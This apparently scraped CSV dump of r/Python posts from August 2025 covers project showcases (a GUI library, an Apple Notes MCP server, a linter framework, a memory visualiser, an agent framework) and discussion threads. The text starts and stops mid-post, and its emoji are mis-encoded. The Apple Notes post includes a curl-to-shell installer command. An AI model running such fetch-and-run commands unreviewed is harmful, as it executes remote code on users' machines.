* Which of the eight principles seem most lacking in your toolbox today?

For anyone interested, I helped write a blog post on this topic, and you can read it here: [*https://clickhouse.com/blog/eight-principles-of-great-developer-experience-for-data-infrastructure*](https://clickhouse.com/blog/eight-principles-of-great-developer-experience-for-data-infrastructure)"
1n0yj9r,New weekly series: Realistic bug-fixing exercises for beginners,Fragrant_Steak_5,1,2,2025-08-26 21:30:44,https://www.reddit.com/r/Python/comments/1n0yj9r/new_weekly_series_realistic_bugfixing_exercises/,"Hi everyone üëã

I‚Äôve been working as a software engineer for about 10 years, and I wanted to start a small initiative to give programming practice a fresh twist. Instead of the usual abstract exercises, I‚Äôm creating¬†*realistic bug-fixing scenarios*¬†inspired by problems you might face in actual projects.

Every week I‚Äôll be sharing a new ‚Äúbug to fix‚Äù in the form of a Colab notebook (for now), so people can practice, learn, and reinforce concepts while thinking like engineers solving real-world issues.

This very first one is designed for beginners who are just starting out üë∂, but the idea is to build a series with different levels:¬†*intern, junior, and semi-senior*. That way, people can grow step by step and tackle challenges that fit their journey.

For now, all exercises will be in Python üêç, but I believe they could be just as valuable as a starting point for people who later want to work with other technologies too.

Please send me a private message and I will share the challenge with you.

I‚Äôd love to hear your feedback üôè‚Äîdoes this approach feel useful, fun, or motivating to you? Any suggestions to improve it are more than welcome!

Thanks a lot for taking a look üíô"
1n0wemp,I Just released Sagebox - a procedural GUI library for Python (Initial Beta),TheRallyMaster,38,22,2025-08-26 20:08:56,https://www.reddit.com/r/Python/comments/1n0wemp/i_just_released_sagebox_a_procedural_gui_library/,"**What My Project Does:**

Sagebox is a comprehensive GUI providing GUI-based controls and graphics, that can be used in a simple procedural manner. 

**Target Audience:**

Anyone, really.   Hobbyists, research, professional.  I have used in the industry quite a lot, but also use it for quick prototyping and just playing around with graphics.  The github page has examples of many different ypes.



**Comparison**:

Sagebox is meant to provide easily-used and access controls that are also scalable into more complex controls as-you-go, which is the main emphasis -- easily-used but scalable as a procedural GUI with a lot of control, widgets, and graphics functions.    
  
One of the main differences, besides being procedural (which some GUIs are, too) is having controls and graphics as specialized areas that can work independently or together, to create personalized control-based windows, as well quick developer-based controls that are easily created and automatically placed. 

  
It's also purposely designed to work with all other GUIs and libraries, so you can use it, for example, to provide controls while using Matlplot lib (see examples on the github page), and it can work along side PySimple Gui or Pygame, since every GUI has it's strengths that people like. 

  
**Here is the main text:** 

  [http://github.com/Sagebox/Pybox](http://github.com/Sagebox/Pybox) (Overview, pip install, screenshots, getting-started example code, and working example projects).

# Sagebox Procedural GUI Toolset Initial Beta
I'm pleased to announce the initial public beta release of Sagebox, a comprehensive, procedurally-based GUI library for Python. This project started a few years ago as a professional tool for my own work, and after being used and proven in industry, I'm excited to finally share it with the developer community as a free GUI toolset. 
> **A quick note on this release**:
As a first release, your feedback and discussion would be great regarding your experiences, any kinks in the process, bugs, etc.  For more details on the current status and roadmap, please see the [About This Beta Release](#about-this-beta-release) section at the end of this post.

# A Comprehensive, Procedural GUI 
Sagebox is a set of GUI tools designed for creative development and rapid prototyping, allowing you to build powerful, graphics-based programs without forms or boilerplate code.

It was designed from scratch for creating everything from full desktop applications and console-mode programs with controls, to just having fun with graphics.
Sagebox has been used for a few years in industry at places like Pioneer, Pentair and ASML, where it was called ***""that magic program.""*** 

## **Some of the key design principles behind Sagebox**

#### No Boilerplate

- Sagebox starts itself up when you use any function, so there is no need to initialize it or set up an environment. You can call up a slider in a console program, for example, with just a few lines of code.

#### Acts as a simple Library
- Built as a self-contained GUI kernel, Sagebox functions as a set of library calls. You can add or remove calls as you want and use all standard types (e.g. numpy arrays, lists, tuples) of choice, without changing your code to suit Sagebox.

#### Scalability
- Sagebox is designed for any level of complexity, from simple console tools to full desktop applications. Controls can be created and used with as little as two lines of code, and the library scales to more powerful graphics and controls as needed (see examples).
- *Self-contained platform- and language-agnostic GUI kernel.* The Sagebox GUI kernel is completely self-contained, allowing it to manage the entire OS GUI environment so your program does not have to, generally creating controls and graphics in fire-and-forget fashion. This also allows the GUI kernel to work on any platform (e.g. Windows, Linux, macOS, Android) as well as remain language-agnostic to work on any language on its own idiomatic terms.

#### Compatible with Other Libraries
- Sagebox is designed to be compatible with other GUI and general libraries like PySimpleGUI, PyGame, *Matplotlib*, etc. . For example, the Python GitHub page has examples of using Sagebox GUI controls with *Matplotlib*.

## GitHub Pages, Installation, Examples and Screenshots
For simple (and full program) code examples, installation instructions, and roadmap details, click on the GitHub page: 

- Python - [http://github.com/Sagebox/Pybox](http://github.com/Sagebox/Pybox) (called Pybox for Python version. C++ and Rust are also supported.)

## Video Examples (YouTube)

You can also view some examples on the YouTube page: 
- [https://www.youtube.com/@projectsagebox](https://www.youtube.com/@projectsagebox) 
**note**: the current videos are Rust examples, but they 
work and look exactly the same in all languages.
 Other C++ and Python videos are currently offline and will be put back online shortly.

# About This Beta Release

This is the first release of Sagebox, which has been used in private industry for a few years. It works with Windows, with Linux support coming in just a few months. 
 
All screenshots and video examples were created with the current version of Sagebox.  It is used already as a robust and comprehensive working beta, and a lot of work has been put in to make it useful for everyone, from hobbyists, professionals, research & education, to just having fun with programming. 

I'm excited about what can be added to it in future versions and the current roadmap: 

- **Break-In Period (2-3 weeks).**  This initial beta period is just 2-3 weeks long to get first impressions, any bugs, kinks, to generally make sure it works for everyone.
- **Next Beta Release (4-6 weeks)**. The next release is scheduled for 4-6 weeks from now with:
  - **Added functionality.**  There is a lot of functionality in Sagebox that has not yet been added to the interface.  This is being completed now, and expect even more interesting things. 
  - **Documentation.**  More documentation will be added.  Right now, the functions have full documentation for the editor, and documentation is always something there can be more of.
- **Windows and Linux.**  The Windows version was released before the linux version on purpose, to help get feedback and usage experiences as the Linux version is being completed.  This was done purposely to get community feedback to help with preferred community directions in the Linux version, particularly with look-and-feel and what things people would prefer prioritized over others (e.g. GPU functions vs. added widgets and other features) -- as well as interoperability with other preferred libraries. 
- **Future Development.** Sagebox is a free GUI toolset. As Sagebox continues to evolve, your feedback and suggestions are appreciated. To follow the project's roadmap and learn more about its future as a community-focused library, please see the GitHub Page.

I look forward to answering any questions you have, feedback and suggestions. 

"
1n0ufg0,"PyWire-eel, a lightweight Python library like eel",Wrong-Cat-5014,4,1,2025-08-26 18:53:24,https://www.reddit.com/r/Python/comments/1n0ufg0/pywireeel_a_lightweight_python_library_like_eel/,"Came across a small project called PyWire-eel on GitHub and thought it was interesting.

It‚Äôs similar to Eel (which recently got archived), but the idea is to provide a lightweight way to connect Python functions with a frontend built in HTML/CSS/JS. Basically you can call Python from JavaScript and the other way around without pulling in something heavy like Electron.

Repo link: https://github.com/Fadi002/PyWire-eel

Curious if anyone here has tried this kind of approach recently. Would you consider it useful, or would you just stick with PyWebView / Qt / Electron?
"
1n0tlht,Apple Notes MCP Server ‚Äì Connect your Apple Notes with LLMs.,watchmoviestime,0,3,2025-08-26 18:21:13,https://www.reddit.com/r/Python/comments/1n0tlht/apple_notes_mcp_server_connect_your_apple_notes/,"# What My Project Does

I built **Apple Notes MCP Server**, a tool that integrates Apple Notes with the [Model Context Protocol (MCP)](https://github.com/modelcontextprotocol). It provides a bridge between your notes and MCP-compatible clients (like Claude Desktop, [Continue.dev](http://Continue.dev), or Perplexity).

With this, you can fully **automate Apple Notes from Python** ‚Äî from managing notes to organizing folders ‚Äî all via a clean MCP interface.

# Features

* Full **CRUD support** for both notes and folders (create, read, update/rename, delete, move)
* **Search & structure tools** to query notes and view folder hierarchies
* Supports **rich HTML content** (headers, lists, tables, links, emoji üöÄüìù)
* Works seamlessly with **multiple MCP clients** (Claude Desktop, [Continue.dev](http://Continue.dev), Perplexity, etc.)

# Quick Start

1. **Install uv** (if not already installed)

&#8203;

    curl -LsSf https://astral.sh/uv/install.sh | sh

1. **Add MCP configuration** to your client (e.g., [Continue.dev](http://Continue.dev), Claude Desktop):

&#8203;

    {
      ""mcpServers"": {
        ""apple-notes"": {
          ""command"": ""uvx"",
          ""args"": [""mcp-apple-notes@latest""]
        }
      }
    }

That‚Äôs it ‚Äî your MCP client will install and run the package automatically.

# Links

üì¶ PyPI: [https://pypi.org/project/mcp-apple-notes/](https://pypi.org/project/mcp-apple-notes/)

üíª Source Code: [https://github.com/henilcalagiya/mcp-apple-notes](https://github.com/henilcalagiya/mcp-apple-notes)

# Target Audience

* **Developers** who want to automate or script Apple Notes workflows.
* **AI/LLM users** who‚Äôd like to use their personal notes as context in AI tools.
* **macOS power users** who want better control of Apple Notes through automation.This project is in **beta** but stable enough for experimentation and light productivity use.

# Comparison

* Unlike general Apple Notes automation scripts, this project uses **MCP (Model Context Protocol)**, which means it plugs directly into multiple AI/LLM clients.
* It provides **full CRUD for both notes and folders** (many existing scripts only handle basic read/write).
* It supports **rich HTML formatting, search, and folder hierarchies** ‚Äî making it more feature-complete than simple AppleScript snippets.
* Built to be **modular and extendable** for future MCP integrations.

Would love to hear your thoughts, feedback, or use-cases you see for this."
1n0tgja,"Would a ""venv"" wrapper around multiprocessing be useful? (hardware-aware pools, NUMA, GPU, etc.)",Beginning_Task_5515,0,3,2025-08-26 18:15:59,https://www.reddit.com/r/Python/comments/1n0tgja/would_a_venv_wrapper_around_multiprocessing_be/,"Hey folks,

I‚Äôve been tinkering with an idea to extend Python‚Äôs built-in `multiprocessing` by adding a concept I call **compute\_venvs** (like virtual environments, but for compute). The idea is to let you define resource-scoped pools that know about CPU cores, NUMA nodes, GPUs, I/O limits, and even niceness/cgroups, and then route tasks accordingly.

`from compute_venv import VEnv, VPool`

`cpu0 = VEnv(name=""cpu0_fast"", cpu_cores=[0,1,2,3], numa_node=0, nice=5)`

`gpu0 = VEnv(name=""gpu0"", gpu=""cuda:0"")`

`with VPool([cpu0, gpu0]) as pool:`

`pool.submit(cpu_heavy_fn, data, hint=""cpu0_fast"")`

`pool.submit(gpu_heavy_fn, data, hint=""gpu0"")`

The module would:

* Add **affinity and isolation** (set process affinity, NUMA binding, GPU selection, nice priority).
* Provide an **auto-tuning scheduler** that benchmarks chunk sizes/queue depth and routes tasks to the best venv.
* Remain **stdlib-compatible**: you can swap in/out `multiprocessing` pools with almost no code change.
* Target single-machine jobs: preprocessing, simulation, ML data prep, video/audio encoding, etc.

It‚Äôs meant as a **lightweight alternative to Ray/Dask** for cases where you don‚Äôt need distributed orchestration, just better hardware-aware tasking on one box.

**Questions for you all:**

1. Would this be useful in your workflows, or is it too niche?
2. Do you think sticking close to `multiprocessing` API is the right approach, or should it be more opinionated?
3. Any obvious ‚Äúgotchas‚Äù I should be aware of (esp. cross-platform)?
4. Benchmarks I should definitely include to prove value?

Thanks! I‚Äôd love to hear your perspectives before I get dirty with this."
1n0t07s,GenEC v1.0.0 - A Python data extraction and comparison tool,EngineerRemy,13,2,2025-08-26 17:59:14,https://www.reddit.com/r/Python/comments/1n0t07s/genec_v100_a_python_data_extraction_and/,"Hi, just this weekend I finalized the 1.0.0 version of my Tool, GenEC, and now I want the world to know ahah. I've already been using it for myself quite a lot of my own work, as well as subtly pushing my coworkers to start using it. I am confident many other people should be able to find a use for my tool as well, so if you're interested in using it, I am always happy to answer questions and provide support.

Repository: [https://github.com/RemyKroese/GenEC](https://github.com/RemyKroese/GenEC)

# What My Project Does

*GenEC (Generic Extraction & Comparison) is a Python-based tool for extracting structured data from files or folders. It offers a flexible, one-size-fits-all extraction framework that you can tailor precisely using configuration parameters.*

It is a tool that lets you extract and count occurrences of data using your own configurations. It can also compare this extracted data against reference files to spot differences. Your configurations can get saved as presets, so you can easily reuse them or automate the whole process by calling GenEC from other tools.

Once you have several presets, you can do batch analysis using a ""preset-list"" file, which is basically a collection of presets to run together. This scales you from analyzing single files to processing entire folders.

To summarize, there are 3 workflows for this tool:

* **Basic:** for experimentation of configurations as well as getting acquainted with the tool
* **Preset:** for single command data extraction (and comparison) using a preset
* **Preset-list:** Enable batch processing by processing data in folders using a group of presets, all with only 1 command

Being a CLI tool, GenEC displays results in [neat tables](https://imgur.com/a/PnQxLGY) right in your terminal. But you can also export everything to CSV, JSON, YAML, or TXT files for further analysis. Which has the following benefits

* **Human readable** output tables in CLI and TXT
* **Machine-readable** output in CSV, JSON and YAML (for the AI enjoyers out there, YAML is likely the best input format for it :P)

I have written extensive documentation on the tool within the repository, but to just link it here separately:

* [README.md](https://github.com/RemyKroese/GenEC/blob/main/README.md)
* [Documentation overview](https://github.com/RemyKroese/GenEC/blob/main/docs/overview.md)

# Target Audience

I like to believe my tool will be applicable for anyone who has the technical knowledge on how to use CLI tooling. The more, you work with data, the more you benefit from this of course:

* Data engineers / analysts / scientists
* Programmers
* QA/Test engineers
* Functions in a data reporting capacity: For example, my Scrum Master has been using it in order to provide data reporting to stakeholders, since we lack internal tooling for all the data we have.

# Comparison

It competes with almost any data analysis tooling, which are:

* Enterprise tooling
* CLI tools / open source (diff / grep, etc.)

I believe GenEC fulfills a nice middle-ground niche, as it creates structured output, allows for reusability and automation and has dynamic configuration parameters, whilst being a lightweight tool."
1n0r5qd,Why no dunder methods for list append/extend?,QuasiEvil,0,30,2025-08-26 16:51:37,https://www.reddit.com/r/Python/comments/1n0r5qd/why_no_dunder_methods_for_list_appendextend/,"I was just recently working on some code where I wanted controlled access to a list attribute (i.e., ensure every element is > 0 say). I naively started writing a descriptor but didn't get very far before realizing that neither `__set__()` nor` __setitem__()` (nor any other dunder method) would do the trick. This seems odd, as having controlled access to a list attribute via getters and setters would be useful, and consistent with other object types.

One could subclass list and override the append/extend methods with the desired behaviour, but I don't really understand why the descriptor pattern couldn't be applied to a list in the usual manner?"
1n0qtav,"lintkit - framework to create linters/checks for Python code, JSON, YAML or TOML",szymonmaszke,15,4,2025-08-26 16:39:01,https://www.reddit.com/r/Python/comments/1n0qtav/lintkit_framework_to_create_linterschecks_for/,"Hey all,

## What my project does

Created a framework which allows you to create new linters/checkers/rules for `Python`, `YAML`, `JSON` or `TOML` (loose plans to extend the list if there's interest).

__Repository__: https://github.com/open-nudge/lintkit

## Key features

- Multiple formats supported (as mentioned)
- Supports well-known `noqa`/ignore comments (not only inline, but also per-file or even range-wise)
- Python-wise small (less than `1000` LOC, see `/src`), provides [tutorials](https://open-nudge.github.io/lintkit/latest/tutorials/) and [API reference](https://open-nudge.github.io/lintkit/latest/reference/lintkit/) to make your life easier
- Flexible - work directly with Python's [`ast`](https://docs.python.org/3/library/ast.html#ast.AST), make rules even across multiple files, settings to adjust the linter to your preference

## Example linter

Below is a linter which verifies no `function` or `class` names contain word `util` (or variations of it):

```python
import lintkit

# Set the name of the linter
lintkit.settings.name = ""NOUTILS""

class _NoUtils(lintkit.check.Regex, lintkit.loader.Python, lintkit.rule.Node):
    def regex(self):
        # Regex to match util(s) variations in function/class name
        return r""_?[Uu]til(s|ities)?""

    def values(self):
        # Yield class or function names from a Python file
        data = self.getitem(""nodes_map"")
        for node in data[self.ast_class()]:
            yield lintkit.Value.from_python(node.name, node)

    def message(self, _):
        return f""{self.ast_class()} name contains util(s) word""

# Concrete rules and their codes
# Disabling linter using noqas supported out of the box!
class ClassNoUtils(_NoUtils, code=0):  # noqa: NOUTILS0
    # ast type we want to focus on in this rule
    def ast_class(self):
        return ast.ClassDef

class FunctionNoUtils(_NoUtils, code=1):  # noqa: NOUTILS0
    def ast_class(self):
        return ast.FunctionDef

lintkit.run(""linter.py"", ""file1.py"", ""file2.py"")

# Example output
#/path/file1.py:23:17 NOUTILS0: ClassDef name contains util(s) word
#/path/file2.py:73:21 NOUTILS1: FunctionDef name contains util(s) word
```

## Target audience

People who would like to create their own linter/automated checks for their code. Mostly Python, but not only (could be used to lint GitHub Actions or `k8s` manifests).

## Comparison

- [`ruff`](https://github.com/astral-sh/ruff) - provides rules out of the box, way faster and production ready, but AFAICT has no interface to add easily your own custom rules via Python, less flexible
- [`flake8`](https://flake8.pycqa.org/en/latest/plugin-development/) - provides plugins, but with less flexibility and that's not the main goal of the project AFAIK

## Other info

- Python template which created all of the boilerplate during initialization (except code in `/src`, `/tests` and docs): https://github.com/open-nudge/opentemplate
- GitHub repo: https://github.com/open-nudge/lintkit

Welcoming feedback/requests either here or on GitHub, you can also follow on [__LinkedIn__](https://www.linkedin.com/company/opennudge),
[__Twitter/X__](https://x.com/opennudge) or [GitHub organization](https://github.com/open-nudge) to have direct info about new tooling, thanks!


"
1n0qjqj,How I Make My Life Easier Using Python and AI (And How You Can Too),zskniazi,0,6,2025-08-26 16:29:00,https://www.reddit.com/r/Python/comments/1n0qjqj/how_i_make_my_life_easier_using_python_and_ai_and/,"
I used to spend hours on boring tasks.
Copying data. Renaming files. Writing emails. Searching the same stuff again and again.
It was exhausting.

Then Python happened. And later‚Ä¶ AI.
Life changed.


---

The Wake-Up Moment

One night, around 2 a.m., I was stuck.
I had this huge Excel file ‚Äî thousands of rows.
I needed to clean it, find patterns, and prepare a report.
Normally, it would take me two days. Minimum.

But I thought, ‚ÄúWhat if I just‚Ä¶ automate it?‚Äù
I opened Python. Wrote a few lines using pandas.
Boom. Five minutes later, the job was done.

I swear, it felt like cheating.


---

Then Came AI

Python was great. But AI? Whole different game.

Imagine this:
I have Python pulling data from multiple sources.
AI reads it. Summarizes it. Writes me a neat report.
Suddenly, I‚Äôm the guy who finishes two days of work before lunch.

Example?
I built a tiny script:

Python scrapes product prices from websites.

AI analyzes trends.

AI then writes a full market report ‚Äî in plain English.


Guess how long it takes?
Fifteen minutes.


---

The Magic Combo

Python + AI isn‚Äôt about coding for the sake of coding.
It‚Äôs about building shortcuts.
Little tools that save you hours.

Some things I‚Äôve automated:

Auto-generating emails based on data

Daily expense tracking with instant summaries

Bulk image renaming + resizing

Writing blog drafts using AI, then refining them myself

Creating personalized study plans for my kid


Each one saves me time. Mental energy. Sanity.


---

You Don‚Äôt Need to Be a Genius

I‚Äôm not some 10x Silicon Valley developer.
I started small. One script at a time.

The trick? Don‚Äôt overthink.
Find one annoying task. Automate it.
Then add AI to make it smarter.

Example:
Instead of manually replying to hundreds of repetitive emails, Python filters them.
AI drafts quick responses.
I just review and hit send.

Feels like having a digital assistant. Without the salary.


---

Final Thought

Python gives you control.
AI gives you speed.
Together? They give you freedom.

Freedom from boring tasks.
Freedom to focus on creative work.
Freedom to spend more time with family.

I don‚Äôt see them as ‚Äútools‚Äù anymore.
They‚Äôre teammates.

If you‚Äôre still doing everything manually, you‚Äôre wasting time.
Start small. Write that first script. Plug in AI.
Trust me ‚Äî your future self will thank you."
1n0owky,"PySurf v1.6.0 - added permission handling, and dev tools",Apart-Television4396,0,4,2025-08-26 15:26:33,https://www.reddit.com/r/Python/comments/1n0owky/pysurf_v160_added_permission_handling_and_dev/,"Hello, everyone! This is the final release before v2.0.0. I finished most of the core browser features.

# Added

* **Enhanced Permission Handling:**¬†PySurf now features robust permission handling for website requests. Users will be prompted for explicit consent when a website attempts to access sensitive features such as:
   * Geolocation
   * Camera (Video Capture)
   * Microphone (Audio Capture)
   * Notifications
   * Mouse Lock
   * Desktop Video/Audio Capture
   * Screen Sharing This enhancement provides greater privacy and control over your browsing experience ([aafc67e](https://github.com/VG-dev1/PySurf/commit/aafc67e08ea483e6750adbf8b6c7d7d6f62e2847))
* **Integrated Developer Tools:**¬†Users now have access to powerful Chromium Developer Tools from the sidebar. This provides advanced debugging and inspection capabilities for web developers ([aafc67e](https://github.com/VG-dev1/PySurf/commit/aafc67e08ea483e6750adbf8b6c7d7d6f62e2847))

Check it out here:¬†[https://github.com/VG-dev1/PySurf](https://github.com/VG-dev1/PySurf)

PS: Please, don't downvote."
1n0ng7f,Whats your favorite Python trick or lesser known feature?,figroot0,458,289,2025-08-26 14:31:52,https://www.reddit.com/r/Python/comments/1n0ng7f/whats_your_favorite_python_trick_or_lesser_known/,I'm always amazed at the hidden gems in python that can make code cleaner or more efficient. Weather its clever use of comprehensions to underrated standard library modules - whats a Python trick you‚Äôve discovered that really saved you some time or made your projects easier
1n0n55h,I created a microservice system for real-time appliance monitoring,ssj_aleksa,15,5,2025-08-26 14:19:57,https://www.reddit.com/r/Python/comments/1n0n55h/i_created_a_microservice_system_for_realtime/,"Hey everyone, I recently built a small project called **Smart Plug Notifier (SPN)**.

**What My Project Does**: It uses **TP-Link Tapo smart plugs** to monitor when my washer and dryer start or finish their cycles. The system is built as an **async, event-driven microservice architecture** with **RabbitMQ** for messaging and a **Telegram bot** for notifications.

For my personal use I only run it on two plugs, but it‚Äôs designed to support many devices. Everything is containerized with **Docker**, so it‚Äôs easy to spin up the full stack (tapo service, notification service, and RabbitMQ).

I‚Äôm mainly using it to never forget my laundry again üòÖ, but it could work for any appliance you want real-time power usage alerts for.

  
**Target Audience:** Anyone who uses smart plugs (Tapo P110 in this case) and has a need for real time notifications.

I‚Äôd love to get some **feedback on the architecture, setup, or ideas for improvements**.  
Here‚Äôs the repo: üëâ [https://github.com/AleksaMCode/smart-plug-notifier](https://github.com/AleksaMCode/smart-plug-notifier)"
1n0mgbv,Memory Graph Web Debugger,Sea-Ad7805,1,0,2025-08-26 13:52:22,https://www.reddit.com/r/Python/comments/1n0mgbv/memory_graph_web_debugger/,"# üß† What My Project Does

memory\_graph is a visualization tool that shows what‚Äôs really happening while Python code is executed:

* how variables reference the same or different objects
* changes to mutable vs immutable data types
* function calls and variable scope
* making shallow vs deep copies

To do this it generates a graph of the program state so you can literally see why your program behaves the way it does.

# üß© Here‚Äôs a small example:

    import copy
    
    def fun(c1, c2, c3, c4):
        c1[0].append(1)
        c2[0].append(2)
        c3[0].append(3)
        c4[0].append(4)
    
    mylist = [[0]]
    c1 = mylist
    c2 = mylist.copy()
    c3 = copy.copy(mylist)
    c4 = copy.deepcopy(mylist)
    fun(c1, c2, c3, c4)
    
    print(mylist) # What output do you expect?

Without visualization beginners often guess wrong about the result, but with memory\_graph the references and copies are clear.

üëâ Run the example in: [Memory Graph Web Debugger](https://memory-graph.com/#code=import+copy%0A%0Adef+fun%28c1%2C+c2%2C+c3%2C+c4%29%3A%0A++++c1%5B0%5D.append%281%29%0A++++c2%5B0%5D.append%282%29%0A++++c3%5B0%5D.append%283%29%0A++++c4%5B0%5D.append%284%29%0A%0Amylist+%3D+%5B%5B0%5D%5D%0Ac1+%3D+mylist%0Ac2+%3D+mylist.copy%28%29%0Ac3+%3D+copy.copy%28mylist%29%0Ac4+%3D+copy.deepcopy%28mylist%29%0Afun%28c1%2C+c2%2C+c3%2C+c4%29%0A%0Aprint%28mylist%29%0A&play)  
üì¶ Source code: [github.com/bterwijn/memory\_graph](https://github.com/bterwijn/memory_graph)

# üéØ Target Audience

* Students dealing with references, copies, and mutability
* Teachers/educators who want to explain Python‚Äôs data model more effectively
* Developers debugging complex programs with nested data structures

# üîç Comparison

A well-known alternative is Python Tutor:

* Python Tutor: browser-based, limited to small code snippets
* memory\_graph: runs locally and works in various IDEs (e.g., VSCode), supports large programs

So memory\_graph is not just for teaching toy examples, but can stretch to helping with real-world debugging of production code.
"
1n0mc2y,Polars Expressions Vs Series,miller_stale,20,4,2025-08-26 13:47:44,https://www.reddit.com/r/Python/comments/1n0mc2y/polars_expressions_vs_series/,"I came into Polars out of curiosity for the performance‚Ä¶ and stayed for the rest! 

After a couple of weeks using polars everyday, I can say I absolutely love it (chefs kissed for how amazing are Polar‚Äôs docs‚Ä¶ stop using LLMs/Stackoverflow altogether for questions regarding Polars). It has completely replaced pandas for me - smoke it out of the water.

But I‚Äôm at the point that‚Äôd like to start getting a more intuitive way of thinking about Expressions and Series. I get that Series are a data structure (their take on  arrays) whilst Expressions are ***representation of a data transformation*** to use in te context of a df method (I can conceptually grasp the difference between a data structure and a transformation)‚Ä¶ But practically speaking, when for instance I‚Äôd like to work with strings (say to replace or match a regex), I found myself with two very similar pages in their docs: pl.Expr.replace() and pl.Series.str.replace() (actually, polars.Expr.str.replace and polars.Series.str.replace are identical).

And I get that these are for two different uses based on the scope (I guess applying df-wide transformations vs a series-wide transformation?); but coming from Pandas I found myself choosing really nilly willy when to use or read the page of one versus the other‚Ä¶ And would like to make a more conscious use/choice of when using one or the other. 

Anybody else finding themselves in that situation? Or is just me? I would truly appreciate if someone could suggest a way to start thinking about Series vs Expression to get a sort of heuristic of how to tell them apart?"
1n0ln2g,Python as a desktop background,According-Home485,45,28,2025-08-26 13:18:56,https://www.reddit.com/r/Python/comments/1n0ln2g/python_as_a_desktop_background/,"So I have this python script that generates a maze and has it scroll, and it also has some 'runners' on it. I managed to set it up as a screensaver, but I was wondering if it was possible to set it as a desktop wallpaper without turning it into a gif since each maze is generated at random.

Update this is what I managed to do with you guys sugestions. I had claude clean it up so hopefully its understandable. So it sort of works, but it overlays the app icons even though they are still accessible and if you press the show desktop button at the bottom it removes it until you open an app. So basically it doesn't work.

[https://github.com/footiper/Maze\_Wallpaper.git](https://github.com/footiper/Maze_Wallpaper.git)

If anyone is interested I have the same thing as a screensaver that works great, just dm me or write it here idc, obv it's free.

"
1n0lcmf,Linden: A lightweight Python framework for AI agents,Kindly_Accountant121,0,8,2025-08-26 13:06:42,https://www.reddit.com/r/Python/comments/1n0lcmf/linden_a_lightweight_python_framework_for_ai/,"Hi everyone,

**TL;DR:** I built Linden, a lightweight alternative to LangChain focused on simplicity and multi-provider support (OpenAI, Groq, Ollama). It's early-stage, and I'm looking for feedback!

**The Motivation** It started with a university project. I was building an agentic RAG system and naturally turned to the big, well-known frameworks. I quickly found myself overwhelmed‚Äîfighting against colossal libraries where I had very little control, navigating thousands of lines of code just to do simple things.

For most use cases, these frameworks are clearly over-engineered. I wanted something that would let me focus on the agent's logic, not the framework's boilerplate. That's why I built Linden.

**What My Project Does** The goal is simplicity and productivity:

‚úÖ **Unified API:** Write once, use with OpenAI, Groq, and Ollama

üß† **Smart Memory:** FAISS-based persistent memory with automatic agent isolation

üõ†Ô∏è **Auto Function Calling:** Python functions ‚Üí LLM tools via docstring parsing

üì¶ **Lean Architecture:** ~500 core lines vs 10k+ in complex alternatives

**‚ö†Ô∏è Early Stage Warning** This is still evolving software. I've been using it successfully for a couple of months, but there are areas for improvement: making configs more flexible, ongoing refactoring, adding providers like Anthropic.

I'm sharing now specifically to get community feedback before the architecture is set in stone.

GitHub: https://github.com/matstech/linden

I'd love to know what you think! Issues, stars ‚≠ê, or suggestions are all welcome."
1n0dpnm,Need someone for python practise,Efficient-Wolf-0000,0,3,2025-08-26 05:42:48,https://www.reddit.com/r/Python/comments/1n0dpnm/need_someone_for_python_practise/,"I am a relatively beginner in python
I have started doing leetcode and hacker rank problems in python 
It would be really great if I would have some company 
Because that way we can exchange the thoughts and see in different dimensions  of the same problem and learn more
Plus, it will make it more fun 
So dm me if u are interested "
1n06wx9,Tuesday Daily Thread: Advanced questions,AutoModerator,7,0,2025-08-26 00:00:45,https://www.reddit.com/r/Python/comments/1n06wx9/tuesday_daily_thread_advanced_questions/,"# Weekly Wednesday Thread: Advanced Questions üêç

Dive deep into Python with our Advanced Questions thread! This space is reserved for questions about more advanced Python topics, frameworks, and best practices.

## How it Works:

1. **Ask Away**: Post your advanced Python questions here.
2. **Expert Insights**: Get answers from experienced developers.
3. **Resource Pool**: Share or discover tutorials, articles, and tips.

## Guidelines:

* This thread is for **advanced questions only**. Beginner questions are welcome in our [Daily Beginner Thread](#daily-beginner-thread-link) every Thursday.
* Questions that are not advanced may be removed and redirected to the appropriate thread.

## Recommended Resources:

* If you don't receive a response, consider exploring r/LearnPython or join the [Python Discord Server](https://discord.gg/python) for quicker assistance.

## Example Questions:

1. **How can you implement a custom memory allocator in Python?**
2. **What are the best practices for optimizing Cython code for heavy numerical computations?**
3. **How do you set up a multi-threaded architecture using Python's Global Interpreter Lock (GIL)?**
4. **Can you explain the intricacies of metaclasses and how they influence object-oriented design in Python?**
5. **How would you go about implementing a distributed task queue using Celery and RabbitMQ?**
6. **What are some advanced use-cases for Python's decorators?**
7. **How can you achieve real-time data streaming in Python with WebSockets?**
8. **What are the performance implications of using native Python data structures vs NumPy arrays for large-scale data?**
9. **Best practices for securing a Flask (or similar) REST API with OAuth 2.0?**
10. **What are the best practices for using Python in a microservices architecture? (..and more generally, should I even use microservices?)**

Let's deepen our Python knowledge together. Happy coding! üåü"
1n03s8h,[Project] Weekend project: System Monitor in Python with PyQt5,Apprehensive_Sea_302,10,2,2025-08-25 21:48:31,https://www.reddit.com/r/Python/comments/1n03s8h/project_weekend_project_system_monitor_in_python/,"Hi everyone üëã

I wanted to share a project I hacked together over two weekends: a cross-platform System Monitor inspired by GNOME‚Äôs monitor, but written entirely in Python using PyQt5 and psutil.

I‚Äôve always relied on system monitors in my workflow, but I kept running into limitations (especially on Windows and some Linux distros where I couldn‚Äôt find a good alternative). So I tried building my own, combining:
	‚Ä¢	psutil ‚Üí to access CPU, memory, processes, disk I/O, network
	‚Ä¢	PyQt5 ‚Üí for the GUI (tabs, preferences dialog, per-core plots)
	‚Ä¢	pyqtgraph ‚Üí for real-time plots with configurable smoothing (EMA)

Main features so far:
	‚Ä¢	Multi-thread, general, and per-core multi-window CPU views
	‚Ä¢	Adjustable refresh intervals, grids, antialiasing, line widths, colors
	‚Ä¢	Inspect/filter/kill processes directly
	‚Ä¢	Memory, swap, and network monitoring
	‚Ä¢	File systems + disk I/O
	‚Ä¢	Several built-in themes (light to deep dark)

üì¶ Installation:

pip install klv-system-monitor

üëâ Repo + screenshots:

https://github.com/karellopez/KLV-System-Monitor

It‚Äôs still early days, but it already replaced the other monitors I used daily.
Would love feedback, especially from those with experience optimizing PyQt5/psutil apps. üöÄ"
1n027ew,Building a competitive local LLM server in Python,jfowers_amd,40,11,2025-08-25 20:47:56,https://www.reddit.com/r/Python/comments/1n027ew/building_a_competitive_local_llm_server_in_python/,"My team at AMD is working on an open, universal way to run speedy LLMs locally on PCs, and we're building it in Python. I'm curious what the community here would think of the work, so here's a showcase post!

**What My Project Does**

